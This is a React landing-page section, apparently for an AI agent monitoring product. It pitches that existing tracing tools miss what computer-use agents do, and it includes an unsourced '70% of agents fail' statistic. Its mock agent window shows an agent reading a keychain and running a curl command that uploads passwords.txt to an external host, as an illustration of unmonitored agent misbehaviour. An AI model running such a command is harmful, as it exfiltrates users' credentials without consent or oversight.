import DesktopWindow from '../design-system/DesktopWindow'
import DesktopRow from '../design-system/DesktopRow'
import GhostBadge from '../design-system/GhostBadge'
import StatHighlight from '../design-system/StatHighlight'
import useScrollReveal from '../../hooks/useScrollReveal'

export default function Problem() {
  const sectionRef = useScrollReveal()

  return (
    <section className="section-light" id="problem" ref={sectionRef}>
      <div className="section-inner">
        <div className="problem-grid">
          <div className="reveal">
            <span className="section-label">[PROBLEM]</span>
            <h2 className="section-headline">Agents are acting.<br />Nobody's watching.</h2>
            <p className="section-body">
              LangSmith, Braintrust, Langfuse — they trace API calls and text outputs.
              But computer-use agents open files, navigate browsers, execute commands.
              That's invisible to every tool on the market today.
            </p>
            <p className="section-body section-body--spaced">
              <StatHighlight>70%</StatHighlight> of AI agents fail at real-world tasks. Developers are deploying blind.
            </p>
          </div>

          <div className="agent-desktop-graphic reveal">
            <DesktopWindow label="agent_runtime.exe">
              <DesktopRow
                icon="🔑"
                appName="Keychain Access"
                action={<>Reading <span className="app-file">login.keychain-db</span></>}
                statusTag="silent"
                statusClass="tag-silent"
              />
              <DesktopRow
                icon="✉️"
                appName="Mail"
                action={<>Drafting to <span className="app-file">all-staff@company.com</span></>}
                statusTag="silent"
                statusClass="tag-silent"
              />
              <DesktopRow
                icon="⚡"
                appName="Terminal"
                action="curl -X POST https://ext.api/upload --data @passwords.txt"
                statusTag="running"
                statusClass="tag-running"
                error
              />
              <div className="desktop-divider" />
              <div className="desktop-error-block">
                <div className="error-icon">⚠</div>
                <div className="error-content">
                  <div className="error-title">AgentRuntimeError</div>
                  <div className="error-msg">Unhandled exception in task executor. Stack trace lost. 3 actions completed without logging.</div>
                </div>
              </div>
            </DesktopWindow>

            <GhostBadge position={1} />
            <GhostBadge position={2} />
            <GhostBadge position={3} />
          </div>
        </div>
      </div>
    </section>
  )
}
